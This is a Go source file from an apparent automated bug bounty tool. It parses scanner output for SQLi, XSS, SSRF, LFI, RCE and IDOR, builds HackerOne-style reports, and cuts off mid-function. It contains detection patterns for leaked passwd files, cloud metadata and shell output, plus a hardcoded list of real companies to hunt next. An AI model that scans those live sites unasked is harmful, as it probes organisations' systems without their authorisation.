// Package bugdetect parses tool output to detect confirmed vulnerabilities,
// generates bug bounty reports, and implements the continuous hunting loop.
package bugdetect

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

// Severity levels for bug bounty
type Severity string

const (
	SeverityCritical Severity = "critical"
	SeverityHigh     Severity = "high"
	SeverityMedium   Severity = "medium"
	SeverityLow      Severity = "low"
	SeverityInfo     Severity = "info"
)

// Bug represents a confirmed vulnerability finding
type Bug struct {
	Title       string
	Severity    Severity
	Tool        string   // which tool found it
	Target      string
	URL         string
	Description string
	Evidence    string   // raw tool output snippet
	CVE         string   // if applicable
	CVSS        float64
	CWE         string
	Confidence  float64  // 0.0-1.0 confidence score
	FoundAt     time.Time
}

// BugReport is a collection of bugs for a target
type BugReport struct {
	Target    string
	Bugs      []Bug
	StartTime time.Time
	EndTime   time.Time
}

// ─── Bug Detection Patterns ───────────────────────────────────────────────────

// nucleiPattern matches nuclei findings: [severity] [template-id] [url]
var nucleiPattern = regexp.MustCompile(`\[(critical|high|medium|low|info)\]\s+\[([^\]]+)\]\s+(\S+)`)

// dalfoxPattern matches dalfox XSS confirmations
var dalfoxPattern = regexp.MustCompile(`(?i)(POC|verified|found|XSS)\s*[:\-]?\s*(https?://\S+)`)

// sqlmapPattern matches CONFIRMED sqlmap injection — must be explicit confirmation lines
// NOT: "not injectable", "NOT VULNERABLE", "does not seem to be injectable"
var sqlmapPattern = regexp.MustCompile(`(?i)(parameter\s+'[^']+'\s+is\s+vulnerable|is\s+vulnerable\s+to|sqlmap\s+identified\s+the\s+following\s+injection)`)

// ssrfPattern matches CONFIRMED SSRF — actual internal response content, not just tool name
var ssrfPattern = regexp.MustCompile(`(?i)(169\.254\.169\.254|metadata\.google\.internal|ssrf.*confirmed|internal.*service.*response|out-of-band.*interaction.*received)`)

// lfiPattern matches CONFIRMED LFI — actual file content leaked
var lfiPattern = regexp.MustCompile(`(?i)(root:x:0:0|daemon:x:|bin:x:|/etc/passwd.*found|lfi.*confirmed|path.*traversal.*confirmed)`)

// rcePattern matches CONFIRMED RCE — actual command output
var rcePattern = regexp.MustCompile(`(?i)(uid=\d+\([a-z]+\)|rce.*confirmed|command.*injection.*confirmed|os-shell.*>|whoami.*=.*root)`)

// idorPattern matches IDOR findings
var idorPattern = regexp.MustCompile(`(?i)(idor|insecure.direct.object|unauthorized.access|403.*bypass|access.control)`)

// cvePattern matches CVE IDs
var cvePattern = regexp.MustCompile(`CVE-\d{4}-\d{4,7}`)

// negativePatterns — if ANY of these appear in the output line, it is NOT a real finding.
// These are explicit "not vulnerable" signals from tools.
var negativePatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)not\s+vulnerable`),
	regexp.MustCompile(`(?i)not\s+injectable`),
	regexp.MustCompile(`(?i)does\s+not\s+seem\s+to\s+be\s+injectable`),
	regexp.MustCompile(`(?i)tested\s+parameters\s+appear\s+to\s+be\s+not\s+injectable`),
	regexp.MustCompile(`(?i)no\s+injection\s+point`),
	regexp.MustCompile(`(?i)state:\s*not\s+vulnerable`),
	regexp.MustCompile(`(?i)no\s+results\s+found`),
	regexp.MustCompile(`(?i)0\s+vulnerabilities`),
	regexp.MustCompile(`(?i)nothing\s+found`),
	regexp.MustCompile(`(?i)target\s+does\s+not\s+appear\s+to\s+be\s+vulnerable`),
	regexp.MustCompile(`(?i)no\s+issues\s+found`),
	regexp.MustCompile(`(?i)scan\s+complete.*0\s+findings`),
	regexp.MustCompile(`(?i)all\s+parameters\s+appear\s+safe`),
	regexp.MustCompile(`(?i)no\s+vulnerabilities\s+detected`),
}

// isNegativeOutput returns true if the output is a "not vulnerable" result — should be skipped.
func isNegativeOutput(output string) bool {
	for _, re := range negativePatterns {
		if re.MatchString(output) {
			return true
		}
	}
	return false
}

// hasMinimumEvidence checks that the output has enough real content to be a valid finding.
// Rejects outputs that are just tool banners, logos, or empty results.
func hasMinimumEvidence(output string) bool {
	trimmed := strings.TrimSpace(output)
	if len(trimmed) < 50 {
		return false
	}
	// Reject if output is only ASCII art / banner lines (no alphanumeric content beyond 20%)
	lines := strings.Split(trimmed, "\n")
	contentLines := 0
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) > 10 && regexp.MustCompile(`[a-zA-Z0-9]{3,}`).MatchString(line) {
			contentLines++
		}
	}
	return contentLines >= 2
}

// ParseNucleiOutput parses nuclei output and returns confirmed bugs — deduplicated
func ParseNucleiOutput(output, target string) []Bug {
	var bugs []Bug
	seen := map[string]bool{} // dedup by template+url

	// Skip entirely if output is negative
	if isNegativeOutput(output) || !hasMinimumEvidence(output) {
		return nil
	}

	lines := strings.Split(output, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// Skip negative lines
		if isNegativeOutput(line) {
			continue
		}

		m := nucleiPattern.FindStringSubmatch(line)
		if m == nil {
			continue
		}

		sev := Severity(strings.ToLower(m[1]))
		templateID := m[2]
		url := m[3]

		// Skip info unless interesting
		if sev == SeverityInfo {
			lower := strings.ToLower(line)
			if !strings.Contains(lower, "exposed") && !strings.Contains(lower, "secret") &&
				!strings.Contains(lower, "token") && !strings.Contains(lower, "key") &&
				!strings.Contains(lower, "takeover") {
				continue
			}
		}

		// Dedup by template+url
		dedupKey := templateID + "|" + url
		if seen[dedupKey] {
			continue
		}
		seen[dedupKey] = true

		cve := ""
		if cveMatches := cvePattern.FindString(line); cveMatches != "" {
			cve = cveMatches
		}

		bug := Bug{
			Title:      fmt.Sprintf("[%s] %s", strings.ToUpper(string(sev)), templateID),
			Severity:   sev,
			Tool:       "nuclei",
			Target:     target,
			URL:        url,
			Evidence:   line,
			CVE:        cve,
			Confidence: toolConfidence("nuclei", sev),
			FoundAt:    time.Now(),
		}
		bug.Description = describeNucleiTemplate(templateID)
		bug.CVSS = severityToCVSS(sev)
		bug.CWE = templateToCWE(templateID)

		bugs = append(bugs, bug)
	}
	return bugs
}

// ParseDalfoxOutput parses dalfox XSS output — only confirmed findings
func ParseDalfoxOutput(output, target string) []Bug {
	var bugs []Bug

	// Skip if output is negative/empty
	if isNegativeOutput(output) || !hasMinimumEvidence(output) {
		return nil
	}

	lines := strings.Split(output, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		lower := strings.ToLower(line)
		// Must have explicit confirmation keywords AND not be a negative line
		if (!strings.Contains(lower, "poc") && !strings.Contains(lower, "verified") &&
			!strings.Contains(lower, "[v]") && !strings.Contains(lower, "[vuln]")) {
			continue
		}
		if isNegativeOutput(line) {
			continue
		}

		url := ""
		if m := dalfoxPattern.FindStringSubmatch(line); m != nil {
			url = m[2]
		}

		bugs = append(bugs, Bug{
			Title:       "Cross-Site Scripting (XSS) — Confirmed",
			Severity:    SeverityHigh,
			Tool:        "dalfox",
			Target:      target,
			URL:         url,
			Description: "Reflected or DOM-based XSS vulnerability confirmed by dalfox. Attacker can execute arbitrary JavaScript in victim's browser.",
			Evidence:    line,
			CVSS:        6.1,
			CWE:         "CWE-79",
			Confidence:  toolConfidence("dalfox", SeverityHigh),
			FoundAt:     time.Now(),
		})
	}
	return bugs
}

// ParseToolOutput is the unified parser — detects bugs from any tool output
func ParseToolOutput(toolName, output, target string) []Bug {
	switch toolName {
	case "nuclei":
		return ParseNucleiOutput(output, target)
	case "dalfox":
		return ParseDalfoxOutput(output, target)
	default:
		return parseGenericOutput(toolName, output, target)
	}
}

// parseGenericOutput uses regex patterns to detect bugs in any tool output.
// Only reports findings with CONFIRMED positive evidence — never on "NOT VULNERABLE" output.
func parseGenericOutput(toolName, output, target string) []Bug {
	var bugs []Bug

	// Hard gate: if output contains explicit "not vulnerable" signals, skip entirely
	if isNegativeOutput(output) {
		return nil
	}

	// Hard gate: output must have real content (not just a tool banner/logo)
	if !hasMinimumEvidence(output) {
		return nil
	}

	if sqlmapPattern.MatchString(output) {
		evidence := extractEvidence(output, sqlmapPattern)
		if evidence != "" && !isNegativeOutput(evidence) {
			conf := toolConfidence("sqlmap", SeverityCritical)
			if conf >= MinConfidenceThreshold {
				bugs = append(bugs, Bug{
					Title:       "SQL Injection — Confirmed",
					Severity:    SeverityCritical,
					Tool:        toolName,
					Target:      target,
					Description: "SQL injection vulnerability confirmed. Attacker can read/modify database, potentially achieve RCE.",
					Evidence:    evidence,
					CVSS:        9.8,
					CWE:         "CWE-89",
					Confidence:  conf,
					FoundAt:     time.Now(),
				})
			}
		}
	}

	if ssrfPattern.MatchString(output) {
		evidence := extractEvidence(output, ssrfPattern)
		if evidence != "" && !isNegativeOutput(evidence) {
			conf := 0.75
			if conf >= MinConfidenceThreshold {
				bugs = append(bugs, Bug{
					Title:       "Server-Side Request Forgery (SSRF) — Confirmed",
					Severity:    SeverityHigh,
					Tool:        toolName,
					Target:      target,
					Description: "SSRF vulnerability confirmed. Server made a request to an internal/controlled endpoint.",
					Evidence:    evidence,
					CVSS:        8.6,
					CWE:         "CWE-918",
					Confidence:  conf,
					FoundAt:     time.Now(),
				})
			}
		}
	}

	if lfiPattern.MatchString(output) {
		evidence := extractEvidence(output, lfiPattern)
		if evidence != "" && !isNegativeOutput(evidence) {
			conf := 0.80
			if conf >= MinConfidenceThreshold {
				bugs = append(bugs, Bug{
					Title:       "Local File Inclusion (LFI) — Confirmed",
					Severity:    SeverityHigh,
					Tool:        toolName,
					Target:      target,
					Description: "LFI vulnerability confirmed. Attacker can read arbitrary files from the server.",
					Evidence:    evidence,
					CVSS:        7.5,
					CWE:         "CWE-22",
					Confidence:  conf,
					FoundAt:     time.Now(),
				})
			}
		}
	}

	if rcePattern.MatchString(output) {
		evidence := extractEvidence(output, rcePattern)
		if evidence != "" && !isNegativeOutput(evidence) {
			conf := 0.90
			if conf >= MinConfidenceThreshold {
				bugs = append(bugs, Bug{
					Title:       "Remote Code Execution (RCE) — Confirmed",
					Severity:    SeverityCritical,
					Tool:        toolName,
					Target:      target,
					Description: "RCE vulnerability confirmed. Attacker can execute arbitrary commands on the server.",
					Evidence:    evidence,
					CVSS:        10.0,
					CWE:         "CWE-78",
					Confidence:  conf,
					FoundAt:     time.Now(),
				})
			}
		}
	}

	// IDOR detection
	if idorPattern.MatchString(output) {
		evidence := extractEvidence(output, idorPattern)
		if evidence != "" && !isNegativeOutput(evidence) {
			conf := 0.60
			if conf >= MinConfidenceThreshold {
				bugs = append(bugs, Bug{
					Title:       "Insecure Direct Object Reference (IDOR)",
					Severity:    SeverityHigh,
					Tool:        toolName,
					Target:      target,
					Description: "Potential IDOR vulnerability detected. Verify by accessing another user's resources.",
					Evidence:    evidence,
					CVSS:        7.5,
					CWE:         "CWE-639",
					Confidence:  conf,
					FoundAt:     time.Now(),
				})
			}
		}
	}

	return bugs
}

// ─── Report Generation ────────────────────────────────────────────────────────

// GenerateReport creates a professional bug bounty report in Markdown
func GenerateReport(report BugReport) string {
	var sb strings.Builder

	sb.WriteString("# CyberMind Bug Bounty Report\n\n")
	sb.WriteString(fmt.Sprintf("**Target:** %s\n", report.Target))
	sb.WriteString(fmt.Sprintf("**Scan Date:** %s\n", report.StartTime.Format("2006-01-02 15:04:05")))
	sb.WriteString(fmt.Sprintf("**Duration:** %s\n", report.EndTime.Sub(report.StartTime).Round(time.Second)))
	sb.WriteString(fmt.Sprintf("**Total Findings:** %d\n\n", len(report.Bugs)))

	// Summary table
	counts := map[Severity]int{}
	for _, b := range report.Bugs {
		counts[b.Severity]++
	}
	sb.WriteString("## Summary\n\n")
	sb.WriteString("| Severity | Count |\n|----------|-------|\n")
	for _, sev := range []Severity{SeverityCritical, SeverityHigh, SeverityMedium, SeverityLow, SeverityInfo} {
		if counts[sev] > 0 {
			sb.WriteString(fmt.Sprintf("| %s | %d |\n", strings.ToUpper(string(sev)), counts[sev]))
		}
	}
	sb.WriteString("\n")

	// Detailed findings — sorted by severity
	sb.WriteString("## Findings\n\n")
	for i, bug := range report.Bugs {
		sb.WriteString(fmt.Sprintf("### %d. %s\n\n", i+1, bug.Title))
		sb.WriteString(fmt.Sprintf("- **Severity:** %s\n", strings.ToUpper(string(bug.Severity))))
		sb.WriteString(fmt.Sprintf("- **CVSS Score:** %.1f\n", bug.CVSS))
		if bug.CWE != "" {
			sb.WriteString(fmt.Sprintf("- **CWE:** %s\n", bug.CWE))
		}
		if bug.CVE != "" {
			sb.WriteString(fmt.Sprintf("- **CVE:** %s\n", bug.CVE))
		}
		sb.WriteString(fmt.Sprintf("- **Tool:** %s\n", bug.Tool))
		if bug.URL != "" {
			sb.WriteString(fmt.Sprintf("- **URL:** `%s`\n", bug.URL))
		}
		sb.WriteString(fmt.Sprintf("- **Found:** %s\n\n", bug.FoundAt.Format("15:04:05")))

		if bug.Description != "" {
			sb.WriteString(fmt.Sprintf("**Description:**\n%s\n\n", bug.Description))
		}

		if bug.Evidence != "" {
			sb.WriteString("**Evidence:**\n```\n")
			evidence := bug.Evidence
			if len(evidence) > 500 {
				evidence = evidence[:500] + "\n... [truncated]"
			}
			sb.WriteString(evidence)
			sb.WriteString("\n```\n\n")
		}

		sb.WriteString("---\n\n")
	}

	return sb.String()
}

// SaveReport saves the report to a file and returns the path
func SaveReport(report BugReport) (string, error) {
	content := GenerateReport(report)
	ts := time.Now().Format("2006-01-02_15-04-05")
	safeTarget := strings.ReplaceAll(report.Target, ".", "_")
	safeTarget = strings.ReplaceAll(safeTarget, "/", "_")
	filename := fmt.Sprintf("cybermind_bugs_%s_%s.md", safeTarget, ts)

	if err := os.WriteFile(filename, []byte(content), 0644); err != nil {
		return "", err
	}
	return filename, nil
}

// HasHighSeverityBugs returns true if report contains medium+ severity bugs
func HasHighSeverityBugs(bugs []Bug) bool {
	for _, b := range bugs {
		if b.Severity == SeverityCritical || b.Severity == SeverityHigh || b.Severity == SeverityMedium {
			return true
		}
	}
	return false
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

func extractEvidence(output string, re *regexp.Regexp) string {
	loc := re.FindStringIndex(output)
	if loc == nil {
		return ""
	}
	start := loc[0] - 100
	if start < 0 {
		start = 0
	}
	end := loc[1] + 200
	if end > len(output) {
		end = len(output)
	}
	return strings.TrimSpace(output[start:end])
}

func severityToCVSS(sev Severity) float64 {
	switch sev {
	case SeverityCritical:
		return 9.0
	case SeverityHigh:
		return 7.5
	case SeverityMedium:
		return 5.0
	case SeverityLow:
		return 3.0
	default:
		return 1.0
	}
}

func templateToCWE(templateID string) string {
	lower := strings.ToLower(templateID)
	switch {
	case strings.Contains(lower, "xss"):
		return "CWE-79"
	case strings.Contains(lower, "sqli") || strings.Contains(lower, "sql"):
		return "CWE-89"
	case strings.Contains(lower, "ssrf"):
		return "CWE-918"
	case strings.Contains(lower, "lfi") || strings.Contains(lower, "path-traversal"):
		return "CWE-22"
	case strings.Contains(lower, "rce") || strings.Contains(lower, "command"):
		return "CWE-78"
	case strings.Contains(lower, "idor"):
		return "CWE-639"
	case strings.Contains(lower, "ssti"):
		return "CWE-94"
	case strings.Contains(lower, "xxe"):
		return "CWE-611"
	case strings.Contains(lower, "open-redirect"):
		return "CWE-601"
	case strings.Contains(lower, "cors"):
		return "CWE-942"
	case strings.Contains(lower, "jwt"):
		return "CWE-347"
	default:
		return ""
	}
}

func describeNucleiTemplate(templateID string) string {
	lower := strings.ToLower(templateID)
	switch {
	case strings.Contains(lower, "xss"):
		return "Cross-Site Scripting vulnerability detected. Attacker can inject malicious scripts into web pages."
	case strings.Contains(lower, "sqli"):
		return "SQL Injection vulnerability detected. Attacker can manipulate database queries."
	case strings.Contains(lower, "ssrf"):
		return "Server-Side Request Forgery detected. Server can be made to make requests to internal services."
	case strings.Contains(lower, "lfi"):
		return "Local File Inclusion detected. Attacker can read arbitrary files from the server."
	case strings.Contains(lower, "rce"):
		return "Remote Code Execution detected. Attacker can execute arbitrary commands on the server."
	case strings.Contains(lower, "takeover"):
		return "Subdomain takeover vulnerability. Attacker can claim this subdomain and serve malicious content."
	case strings.Contains(lower, "exposure") || strings.Contains(lower, "exposed"):
		return "Sensitive information exposure detected. Credentials, tokens, or configuration data may be accessible."
	case strings.Contains(lower, "default-login"):
		return "Default credentials detected. Service is using factory-default username/password."
	case strings.Contains(lower, "misconfig"):
		return "Security misconfiguration detected. Service is improperly configured, creating a security risk."
	default:
		return fmt.Sprintf("Vulnerability detected by nuclei template: %s", templateID)
	}
}

// ─── Confidence Scoring ───────────────────────────────────────────────────────

// MinConfidenceThreshold — skip findings below this confidence level
const MinConfidenceThreshold = 0.5

// toolConfidence returns the base confidence for a tool's findings
func toolConfidence(toolName string, severity Severity) float64 {
	switch toolName {
	case "nuclei":
		switch severity {
		case SeverityCritical:
			return 0.95
		case SeverityHigh:
			return 0.85
		case SeverityMedium:
			return 0.70
		default:
			return 0.60
		}
	case "dalfox":
		return 0.90 // dalfox confirmed XSS
	case "sqlmap":
		return 0.95 // sqlmap confirmed SQLi
	case "ghauri":
		return 0.92 // ghauri confirmed SQLi
	default:
		return 0.60 // generic pattern match
	}
}

// ─── IDOR Detection ───────────────────────────────────────────────────────────

// idorConfirmedPattern matches confirmed IDOR — actual unauthorized data access
var idorConfirmedPattern = regexp.MustCompile(`(?i)(unauthorized.*access.*user|access.*other.*user.*data|idor.*confirmed|object.*reference.*bypass|200.*different.*user.*id)`)

// ParseIDOROutput parses IDOR scan output for confirmed findings
func ParseIDOROutput(output, target string) []Bug {
	var bugs []Bug
	if isNegativeOutput(output) || !hasMinimumEvidence(output) {
		return nil
	}
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || isNegativeOutput(line) {
			continue
		}
		if idorConfirmedPattern.MatchString(line) || idorPattern.MatchString(line) {
			confidence := 0.65
			if idorConfirmedPattern.MatchString(line) {
				confidence = 0.80
			}
			if confidence < MinConfidenceThreshold {
				continue
			}
			bugs = append(bugs, Bug{
				Title:       "Insecure Direct Object Reference (IDOR)",
				Severity:    SeverityHigh,
				Tool:        "idor-scan",
				Target:      target,
				Description: "IDOR vulnerability detected. Attacker can access or modify other users' data by manipulating object identifiers.",
				Evidence:    line,
				CVSS:        7.5,
				CWE:         "CWE-639",
				Confidence:  confidence,
				FoundAt:     time.Now(),
			})
		}
	}
	return bugs
}

// ─── Business Logic Detection ─────────────────────────────────────────────────

// bizLogicPatterns matches business logic vulnerabilities
var bizLogicPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)(negative.*price|price.*-\d|zero.*price|price.*0\.00)`),
	regexp.MustCompile(`(?i)(coupon.*reuse|same.*coupon.*applied|discount.*applied.*multiple)`),
	regexp.MustCompile(`(?i)(email.*change.*without.*verification|account.*takeover.*email|unverified.*email.*change)`),
	regexp.MustCompile(`(?i)(race.*condition.*success|concurrent.*request.*success|double.*spend)`),
}

// ParseBizLogicOutput parses business logic test output
func ParseBizLogicOutput(output, target string) []Bug {
	var bugs []Bug
	if isNegativeOutput(output) || !hasMinimumEvidence(output) {
		return nil
	}
	for _, pattern := range bizLogicPatterns {
		if pattern.MatchString(output) {
			evidence := extractEvidence(output, pattern)
			if evidence == "" || isNegativeOutput(evidence) {
				continue
			}
			title := "Business Logic Vulnerability"
			desc := "Business logic flaw detected."
			lower := strings.ToLower(evidence)
			if strings.Contains(lower, "price") {
				title = "Price Manipulation"
				desc = "Price manipulation vulnerability. Attacker can set negative or zero prices."
			} else if strings.Contains(lower, "coupon") {
				title = "Coupon Reuse Vulnerability"
				desc = "Coupon can be applied multiple times, leading to unauthorized discounts."
			} else if strings.Contains(lower, "email") {
				title = "Account Takeover via Email Change"
				desc = "Email change without verification allows account takeover."
			} else if strings.Contains(lower, "race") {
				title = "Race Condition"
				desc = "Race condition allows concurrent requests to bypass business logic."
			}
			bugs = append(bugs, Bug{
				Title:       title,
				Severity:    SeverityHigh,
				Tool:        "bizlogic",
				Target:      target,
				Description: desc,
				Evidence:    evidence,
				CVSS:        7.0,
				CWE:         "CWE-840",
				Confidence:  0.70,
				FoundAt:     time.Now(),
			})
		}
	}
	return bugs
}

// ─── Second-Order Bug Detection ───────────────────────────────────────────────

// storedXSSPattern matches stored/second-order XSS indicators
var storedXSSPattern = regexp.MustCompile(`(?i)(stored.*xss|persistent.*xss|second.*order.*xss|xss.*stored|xss.*persisted)`)

// secondOrderSQLiPattern matches second-order SQLi indicators
var secondOrderSQLiPattern = regexp.MustCompile(`(?i)(second.*order.*sql|stored.*sql.*injection|second.*order.*injection)`)

// ParseSecondOrderOutput parses output for second-order vulnerabilities
func ParseSecondOrderOutput(output, target string) []Bug {
	var bugs []Bug
	if isNegativeOutput(output) || !hasMinimumEvidence(output) {
		return nil
	}
	if storedXSSPattern.MatchString(output) {
		evidence := extractEvidence(output, storedXSSPattern)
		if evidence != "" && !isNegativeOutput(evidence) {
			bugs = append(bugs, Bug{
				Title:       "Stored/Second-Order XSS",
				Severity:    SeverityHigh,
				Tool:        "second-order",
				Target:      target,
				Description: "Stored XSS vulnerability. Malicious script is persisted and executed when other users view the content.",
				Evidence:    evidence,
				CVSS:        8.0,
				CWE:         "CWE-79",
				Confidence:  0.75,
				FoundAt:     time.Now(),
			})
		}
	}
	if secondOrderSQLiPattern.MatchString(output) {
		evidence := extractEvidence(output, secondOrderSQLiPattern)
		if evidence != "" && !isNegativeOutput(evidence) {
			bugs = append(bugs, Bug{
				Title:       "Second-Order SQL Injection",
				Severity:    SeverityCritical,
				Tool:        "second-order",
				Target:      target,
				Description: "Second-order SQL injection. Malicious input is stored and later used in an unsafe SQL query.",
				Evidence:    evidence,
				CVSS:        9.0,
				CWE:         "CWE-89",
				Confidence:  0.75,
				FoundAt:     time.Now(),
			})
		}
	}
	return bugs
}

// ─── Chain Detection ──────────────────────────────────────────────────────────

// BugChain represents a chain of vulnerabilities that together form a higher-impact attack
type BugChain struct {
	Title       string
	Bugs        []Bug
	Impact      string
	Severity    Severity
	Confidence  float64
}

// ChainDetect analyzes a list of bugs and identifies exploit chains
func ChainDetect(bugs []Bug) []BugChain {
	var chains []BugChain

	// Build lookup maps
	hasSSRF := false
	hasXSS := false
	hasCSRF := false
	hasSQLi := false
	hasAdminPanel := false
	hasOpenPort := false

	for _, b := range bugs {
		lower := strings.ToLower(b.Title + " " + b.Description + " " + b.Evidence)
		if strings.Contains(lower, "ssrf") {
			hasSSRF = true
		}
		if strings.Contains(lower, "xss") {
			hasXSS = true
		}
		if strings.Contains(lower, "csrf") {
			hasCSRF = true
		}
		if strings.Contains(lower, "sql") {
			hasSQLi = true
		}
		if strings.Contains(lower, "admin") || strings.Contains(lower, "panel") {
			hasAdminPanel = true
		}
		if strings.Contains(lower, "port") || strings.Contains(lower, "open") {
			hasOpenPort = true
		}
	}

	// SSRF + open port → potential SSRF→RCE chain
	if hasSSRF && hasOpenPort {
		chains = append(chains, BugChain{
			Title:      "SSRF → Internal Service Access → Potential RCE",
			Impact:     "SSRF can be used to access internal services (Redis, Memcached, internal APIs). If internal services are vulnerable, this can lead to RCE.",
			Severity:   SeverityCritical,
			Confidence: 0.75,
		})
	}

	// XSS + CSRF → account takeover chain
	if hasXSS && hasCSRF {
		chains = append(chains, BugChain{
			Title:      "XSS + CSRF → Account Takeover",
			Impact:     "XSS can be used to steal CSRF tokens and perform CSRF attacks, leading to account takeover without user interaction.",
			Severity:   SeverityHigh,
			Confidence: 0.80,
		})
	}

	// SQLi + admin panel → full compromise chain
	if hasSQLi && hasAdminPanel {
		chains = append(chains, BugChain{
			Title:      "SQLi + Admin Panel → Full Application Compromise",
			Impact:     "SQL injection can be used to extract admin credentials, which combined with admin panel access leads to full application compromise.",
			Severity:   SeverityCritical,
			Confidence: 0.85,
		})
	}

	return chains
}

// ─── Race Condition Detection ─────────────────────────────────────────────────

// raceConditionPattern matches race condition success indicators
var raceConditionPattern = regexp.MustCompile(`(?i)(race.*condition.*detected|concurrent.*request.*success|double.*spend.*detected|race.*win|parallel.*request.*bypass)`)

// ParseRaceConditionOutput parses race condition test output
func ParseRaceConditionOutput(output, target string) []Bug {
	var bugs []Bug
	if isNegativeOutput(output) || !hasMinimumEvidence(output) {
		return nil
	}
	if raceConditionPattern.MatchString(output) {
		evidence := extractEvidence(output, raceConditionPattern)
		if evidence != "" && !isNegativeOutput(evidence) {
			bugs = append(bugs, Bug{
				Title:       "Race Condition",
				Severity:    SeverityHigh,
				Tool:        "race-check",
				Target:      target,
				Description: "Race condition vulnerability detected. Concurrent requests can bypass business logic controls.",
				Evidence:    evidence,
				CVSS:        7.5,
				CWE:         "CWE-362",
				Confidence:  0.70,
				FoundAt:     time.Now(),
			})
		}
	}
	return bugs
}

// ─── Next Target Suggestion ───────────────────────────────────────────────────

// SuggestNextTarget returns a list of good bug bounty targets when current target yields no bugs
func SuggestNextTarget(currentTarget string) []string {
	// Curated list of bug bounty programs with wide scope and good payouts
	// These are all public programs on HackerOne/Bugcrowd
	targets := []string{
		"shopify.com",
		"gitlab.com",
		"automattic.com",
		"uber.com",
		"twitter.com",
		"github.com",
		"dropbox.com",
		"yahoo.com",
		"verizonmedia.com",
		"paypal.com",
		"microsoft.com",
		"apple.com",
		"google.com",
		"mozilla.org",
		"wordpress.com",
	}

	// Remove current target from suggestions
	var suggestions []string
	for _, t := range targets {
		if t != currentTarget {
			suggestions = append(suggestions, t)
		}
	}

	// Return top 5
	if len(suggestions) > 5 {
		return suggestions[:5]
	}
	return suggestions
}

// GetBugBountyInfo returns program info for a target
func GetBugBountyInfo(target string) string {
	programs := map[string]string{
		"shopify.com":      "HackerOne — $500-$50,000 | Wide scope: *.shopify.com, *.myshopify.com",
		"gitlab.com":       "HackerOne — $300-$33,500 | Wide scope: *.gitlab.com + self-hosted",
		"automattic.com":   "HackerOne — $150-$7,500 | Wide scope: *.wordpress.com, *.wp.com",
		"uber.com":         "HackerOne — $500-$10,000 | Wide scope: *.uber.com, *.ubereats.com",
		"twitter.com":      "HackerOne — $140-$15,000 | Wide scope: *.twitter.com, *.x.com",
		"github.com":       "HackerOne — $617-$30,000 | Wide scope: *.github.com, *.githubusercontent.com",
		"dropbox.com":      "HackerOne — $216-$32,768 | Wide scope: *.dropbox.com",
		"yahoo.com":        "HackerOne — $50-$15,000 | Wide scope: *.yahoo.com",
		"paypal.com":       "HackerOne — $150-$10,300 | Wide scope: *.paypal.com",
		"microsoft.com":    "MSRC — $500-$250,000 | Wide scope: *.microsoft.com, *.azure.com",
		"mozilla.org":      "HackerOne — $500-$10,000 | Wide scope: *.mozilla.org, *.firefox.com",
		"wordpress.com":    "HackerOne — $150-$7,500 | Wide scope: *.wordpress.com",
	}

	if info, ok := programs[target]; ok {
		return info
	}
	return fmt.Sprintf("Check HackerOne/Bugcrowd for %s program details", target)
}

// ReportFilePath returns the path where a report would be saved
func ReportFilePath(target string) string {
	ts := time.Now().Format("2006-01-02")
	safeTarget := strings.ReplaceAll(target, ".", "_")
	return filepath.Join(".", fmt.Sprintf("cybermind_bugs_%s_%s.md", safeTarget, ts))
}

// GenerateH1Report creates a HackerOne-ready submission report
func GenerateH1Report(report BugReport, pocs map[int]string) string {
	var sb strings.Builder

	if len(report.Bugs) == 0 {
		return ""
	}

	// Use the highest severity bug as the main report
	mainBug := report.Bugs[0]
	for _, b := range report.Bugs {
		if b.CVSS > mainBug.CVSS {
			mainBug = b
		}
	}

	poc := ""
	for i, b := range report.Bugs {
		if b.Title == mainBug.Title {
			if p, ok := pocs[i]; ok {
				poc = p
			}
			break
		}
	}

	// HackerOne title format: [Severity] Vulnerability Type on target.com
	title := fmt.Sprintf("[%s] %s on %s",
		strings.ToUpper(string(mainBug.Severity)),
		mainBug.Title,
		report.Target)

	sb.WriteString("# HackerOne Bug Report\n\n")
	sb.WriteString(fmt.Sprintf("## Title\n%s\n\n", title))
	sb.WriteString(fmt.Sprintf("## Severity\n**%s** (CVSS %.1f)\n\n", strings.ToUpper(string(mainBug.Severity)), mainBug.CVSS))

	if mainBug.CWE != "" {
		sb.WriteString(fmt.Sprintf("## Weakness\n%s\n\n", mainBug.CWE))
	}
	if mainBug.CVE != "" {
		sb.WriteString(fmt.Sprintf("## CVE\n%s\n\n", mainBug.CVE))
	}

	sb.WriteString("## Summary\n")
	sb.WriteString(mainBug.Description + "\n\n")

	sb.WriteString("## Impact\n")
	sb.WriteString(impactFromSeverity(mainBug) + "\n\n")

	sb.WriteString("## Steps to Reproduce\n\n")
	if poc != "" {
		sb.WriteString(poc + "\n\n")
	} else {
		sb.WriteString(fmt.Sprintf("1. Navigate to: `%s`\n", mainBug.URL))
		sb.WriteString("2. Observe the vulnerability as described in the evidence below\n\n")
	}

	sb.WriteString("## Evidence\n```\n")
	evidence := mainBug.Evidence
	if len(evidence) > 1000 {
		evidence = evidence[:1000] + "\n... [truncated]"
	}
	sb.WriteString(evidence + "\n```\n\n")

	if mainBug.URL != "" {
		sb.WriteString(fmt.Sprintf("## Affected URL\n`%s`\n\n", mainBug.URL))
	}

	sb.WriteString("## Remediation\n")
	sb.WriteString(remediationFromCWE(mainBug.CWE) + "\n\n")

	sb.WriteString("## Additional Findings\n\n")
	for i, bug := range report.Bugs {
		if bug.Title == mainBug.Title {
			continue
		}
		sb.WriteString(fmt.Sprintf("### %d. %s [%s]\n", i+1, bug.Title, strings.ToUpper(string(bug.Severity))))
		if bug.URL != "" {
			sb.WriteString(fmt.Sprintf("- URL: `%s`\n", bug.URL))
		}
		sb.WriteString(fmt.Sprintf("- Tool: %s | CVSS: %.1f\n\n", bug.Tool, bug.CVSS))
	}

	sb.WriteString("---\n*Report generated by CyberMind CLI — AI-powered bug bounty platform*\n")
	return sb.String()
}

func impactFromSeverity(bug Bug) string {
	switch bug.CWE {
	case "CWE-79":
		return "An attacker can execute arbitrary JavaScript in the victim's browser, leading to session hijacking, credential theft, or account takeover."
	case "CWE-89":
